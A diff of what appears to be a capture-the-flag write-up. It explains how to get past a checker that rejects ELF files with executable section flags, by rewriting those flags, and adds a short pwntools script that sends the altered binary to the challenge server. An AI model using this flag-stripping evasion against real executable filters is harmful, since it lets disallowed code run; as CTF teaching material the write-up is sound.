@@ -24,4 +24,19 @@ for section in elf.sections:
 elf.run()
 ```
 
-`fairy.py` check sections flag of input file. If there is EXECINSTR flag in `sh_flags`, program turns off. However, `sh_flags` doesn't affect execution of the program, so just remove every EXECINSTR flag. funny trick lol. If section's flag is `06`, change it to `02`. After manipulating, send it to 
+`fairy.py` check sections flag of input file. If there is EXECINSTR flag in `sh_flags`, program turns off. However, `sh_flags` doesn't affect execution of the program, so just remove every EXECINSTR flag. funny trick lol. If section's flag is `06`, change it to `02`. After manipulating, send it to server.
+
+# exploit
+
+```python
+from pwn import *
+import base64
+
+p = remote('20.84.72.194', '5002')
+#p = process(['python3', 'fairy.py'])
+
+dt = base64.b64encode(open('./ex_nofilter', 'rb').read())
+p.sendlineafter(b'!!', dt)
+p.interactive()
+```
+
